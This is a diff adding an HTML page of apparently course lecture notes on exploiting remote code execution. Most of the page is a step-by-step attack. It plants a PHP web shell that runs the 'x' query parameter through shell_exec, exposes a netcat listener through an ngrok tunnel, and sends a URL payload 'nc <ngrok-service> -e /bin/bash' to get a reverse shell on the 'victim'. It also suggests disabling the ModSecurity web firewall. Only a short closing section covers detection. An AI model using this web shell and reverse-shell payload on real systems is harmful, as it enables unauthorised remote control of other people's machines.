@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="Stylesheet" type="text/css" href="style.css">
+<link rel="alternate" type="application/rss+xml" title="RSS" href="rss.xml">
+<title>WBALecture2-1</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+
+<div id="Exploiting RCE"><h1 id="Exploiting RCE" class="header"><a href="#Exploiting RCE">Exploiting RCE</a></h1></div>
+
+<p>
+An RCE (Remote Code Execution) is the execution of your command on the enemies (victim) machine.
+</p>
+
+<p>
+A reverse shell though, is an escalation of that, that is harder to detect, and that dumps itself as a file inside the memory and leaves there, and allows to expoit <span id="Exploiting RCE-multiple"></span><strong id="multiple">multiple</strong> commands, and not only one at a time. Also, it might be defined as a "connect-back" shell on the victim's machine, that redirects input/output to a remote machine (the attacker)
+</p>
+
+<p>
+<span id="Exploiting RCE-Ngrok"></span><strong id="Ngrok">Ngrok</strong> is a very handy tool that can work as a kind of proxy, or maybe even client that can help you keep the traffic.
+</p>
+
+<p>
+A dumb definition for Ngrok is "API first ingress as-a-servic". In easier words, it is just a simulation of an "API", which is really focused on <span id="Exploiting RCE-incoming traffic"></span><strong id="incoming traffic">incoming traffic</strong> (ingress). This also might mean that we can expose a local sercice to a DNS name reachable from the internet.
+</p>
+
+<p>
+The connection is initiated from within the local network, to the outside.
+</p>
+
+<div id="Exploiting RCE-Let's exploit it!"><h2 id="Let's exploit it!" class="header"><a href="#Exploiting RCE-Let's exploit it!">Let's exploit it!</a></h2></div>
+
+<p>
+First, we are going to fire up our Kali VM and create php file which will be sending our commands. Also do not forget to check if apache is up and running.
+</p>
+
+<ul>
+<li>
+Create a file called <span id="Exploiting RCE-Let's exploit it!-/var/www/html/rce.php"></span><strong id="/var/www/html/rce.php">/var/www/html/rce.php</strong> (this is directory for apache) with the following code:
+<pre php>
+&lt;?php
+	$output = shell_exec($_GET["x"]);
+	echo "&lt;pre&gt;$output&lt;/pre&gt;";
+?&gt;
+</pre>
+
+<li>
+Check again if <span id="Exploiting RCE-Let's exploit it!-apache"></span><strong id="apache">apache</strong> is running by running:
+<pre bash>
+sudo netstat -ntlp | grep apache2
+</pre>
+
+<li>
+Create a free account on ngrok, and download it.
+
+<li>
+Start the ngrok:
+<pre bash>
+./ngrok http 80
+</pre>
+
+<li>
+Then you will be able to see that there is a tunnel that will redirect any traffic - to our machine on port 80. Hence, go and test it in your browser whether you can access the standart site (http!).
+
+<li>
+You can now stop the ngrok, because we will need to use the raw TCP connection for our exploit.
+
+<li>
+Open 2 terminals, and:
+
+<ul>
+<li>
+In the first one (ngrok agent, as a raw tcp socket) run the:
+<pre bash>
+	./ngrok tcp 12345
+</pre>
+
+<li>
+In the other one (a netcat listener) run the:
+<pre bash>
+	nc -lvp 12345
+</pre>
+
+</ul>
+</ul>
+<p>
+What we got now, is a tunnel, an open site somewhere on ngrok servers, that will redirect traffic to our localhost, where we got our netcat (which is like capturing all the possible network that may come in)
+</p>
+
+<p>
+We are lacking one more thing - a vulnerable website. Hence we navigate to our localhost and especially to our rce.php! The main URL parameter that we will be using for our code executions is just called "x".:
+</p>
+<ul>
+<li>
+It should look like this:
+<pre>
+http://kali-address/rce.php?x=
+</pre>
+
+</ul>
+<p>
+We need to connect our website to our netcat service, hence we will do the next thing:
+</p>
+<pre>
+http://&lt;kali-address&gt;/rce.php?x=nc%20&lt;ngrok-service&gt;%20-e%20/bin/bash
+</pre>
+
+<p>
+This will allow us to link our website with our netcat and run /bash as the shell, and also it is important to notice the "-e" flag, and also the %20 in UTF-8/URL encoding which is just a space.
+</p>
+
+<p>
+Small tip as I remember - if you want to run a command that does not want to get executed, you can try and run it from the /bin or /usr/bin, like /bin/cat file.txt 
+</p>
+
+<p>
+After all of this, we should be able to see a new line appear in our netcat terminal, meaning we got someone on the bait.
+</p>
+
+<p>
+And now, in your netcat terminal, you can run bash commands, and you will get the output from the computer of the victim!
+</p>
+
+<div id="Exploiting RCE-Let's exploit it!-Some more explanation:"><h3 id="Some more explanation:" class="header"><a href="#Exploiting RCE-Let's exploit it!-Some more explanation:">Some more explanation:</a></h3></div>
+
+<p>
+So overall what is the idea
+</p>
+
+<p>
+You are listening for your website send you shells!
+</p>
+
+<p>
+Once a user goes to your website, you will make HIM, send you A SHELL. So it is like the user is just sending/offering you the shel (like go ahead, use it for me and etc)
+</p>
+
+<div id="Exploiting RCE-Let's exploit it!-More explanation upon how to run a reverse shell:"><h3 id="More explanation upon how to run a reverse shell:" class="header"><a href="#Exploiting RCE-Let's exploit it!-More explanation upon how to run a reverse shell:">More explanation upon how to run a reverse shell:</a></h3></div>
+
+<p>
+Afterwards you can run linux commands and get the information about your machine
+</p>
+
+<p>
+Then inside the query (code is a query parameter) you can do <code>nc &lt;url&gt; &lt;port&gt;(same as the other netcat you ran) -e /bin/bash</code> <code>http://127.0.0.1/rce.php?code=nc localhost 8888 -e /bin/bash</code>
+Then in your other terminal where you ran netcat, you should see that someone connected, and then you will be able to run shell commands straight from there.
+You can as well use ngrok (which will mostly be just an API that is hosted and redirects traffic to another port you select, preferably the same as with netcat) <code>ngrok tcp &lt;port&gt;</code> and then in the query parameter, you will use the host and port from the <span id="Exploiting RCE-Let's exploit it!-More explanation upon how to run a reverse shell:-forwarding"></span><strong id="forwarding">forwarding</strong> section. That way you will be able to have RCE on the other PC's
+</p>
+
+<p>
+<span id="Exploiting RCE-Let's exploit it!-More explanation upon how to run a reverse shell:-TIP"></span><strong id="TIP">TIP</strong>: Also a useful command should be 
+</p>
+<pre>
+sudo a2dismod security2
+</pre>
+
+<div id="Exploiting RCE-How to detect it?"><h2 id="How to detect it?" class="header"><a href="#Exploiting RCE-How to detect it?">How to detect it?</a></h2></div>
+
+<p>
+To detect the reverse-shell:
+</p>
+
+<p>
+You need to know what the normal is. Afterwards you should go ahead and check ps aux and check for the apache2 processes. So for example there you can detect a child process from the apache2 that is basically a shell
+</p>
+
+</body>
+</html>
